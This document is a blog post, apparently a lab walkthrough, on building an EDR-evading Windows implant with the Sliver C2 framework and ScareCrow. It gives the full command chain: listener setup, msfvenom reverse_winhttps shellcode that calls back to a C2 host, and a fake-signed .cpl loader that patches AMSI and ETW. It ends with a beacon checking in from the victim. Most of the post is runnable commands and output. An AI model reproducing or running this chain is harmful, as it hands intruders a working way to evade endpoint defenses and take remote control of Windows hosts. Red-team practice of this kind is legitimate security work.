---
layout: post
title: Using ScareCrow to Side Load Sliver Shell Code 
#subtitle: Using ScareCrow to Side Load Sliver Shell Code
#thumbnail-img: /assets/img/nunchucks.png
tags: [SLIVER]
---

# ScareCow
ScareCrow serves as a framework designed for generating payloads that can be sideloaded, rather than injected, into a legitimate Windows process. This sideloading approach allows it to bypass Application Whitelisting controls. After the DLL loader is loaded into memory, it employs a method to eliminate any hooks placed by an EDR (Endpoint Detection and Response) system within the system DLLs running in the process's memory. This technique is effective because EDR hooks are typically applied when a process is initially spawned.

In this short blog post I will generate some some shell code from the Sliver C2 framework. I'll then pass it through ScareCrow to receive a loader, equipped with common EDR evasion tactics. I'll then execute it on a updated windows host to get a call back. Once nice notable tatic that ScareCrow employs AES encryption to secure the raw shellcode. This step is crucial in preventing static detection when a security product scans the generated loader on disk. Notably, Windows Defender is pretty good at detecting shell code
# Demo
I'll start off by configuring my Sliver Sliver server to listen for connections and host the shellcode

Lets create our profile and start the job. This will be our stage 2 payload 
```
sliver > profiles new beacon --mtls 10.10.1.49:443 --evasion -f shellcode --jitter 4 --arch amd64 --os Windows crow
[*] Saved new implant profile (beacon) crow

sliver > mtls --lhost 10.10.1.49 --lport 443
[*] Starting mTLS listener ...
[*] Successfully started job #1
```

Next I'll create a new listener that the initial connection from the victim will come to.
```
sliver > stage-listener --url https://10.10.1.49:8443 --profile crow --prepend-size

[*] Sliver name for profile: CHEMICAL_PINEAPPLE
[*] Job 2 (https) started
```

On kali using `msfvenom` we can create some shell code that ScareCrow will use. Per the Sliver documentation I used `winhttps` as `win_http` does not work at this time.
```
┌──(root㉿kali)-[~/sliver]
└─# msfvenom -p windows/x64/custom/reverse_winhttps LHOST=10.10.1.49 LPORT=8443 LURI=/crow.woff -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 992 bytes
Saved as: shellcode.bin
```

Then I used `ScareCrow` to put generate a control panel applet that will load the loader into memory and execute the shell code.
```
┌──(root㉿kali)-[/opt/ScareCrow]
└─# ./ScareCrow -I /root/sliver/shellcode.bin -domain microsoft.com -Loader control

  _________                           _________
 /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
 \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
 /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     /
/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/
        \/     \/     \/            \/        \/
                                                        (@Tyl0us)
        “Fear, you must understand is more than a mere obstacle.
        Fear is a TEACHER. the first one you ever had.”

[*] Encrypting Shellcode Using ELZMA Encryption
[+] Shellcode Encrypted
[+] Patched ETW Enabled
[+] Patched AMSI Enabled
[+] Sleep Timer set for 2741 milliseconds
[*] Creating an Embedded Resource File
[+] Created Embedded Resource File With bthprop's Properties
[*] Compiling Payload
[+] Payload Compiled
[*] Signing bthprop.dll With a Fake Cert
[+] Signed File Created
[+] bthprop.cpl File Ready
[!] Sha256 hash of bthprop.cpl: 36dc05d689a2efabff6adb8126bf9b7f6cd0b67878b539b138e8e257b619100c
```

With everything set up I transferred the `.cpl` file over to the victim machine and then executed it

![scarecrow](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/scarecrow.png)

Back on the Sliver Server a new beacon checks in
```
[*] Beacon b14e0ce6 CHEMICAL_PINEAPPLE - 10.10.1.47:55464 (Workstation) - windows/amd64 - Mon, 15 May 2023 22:40:36 MDT

sliver >
```
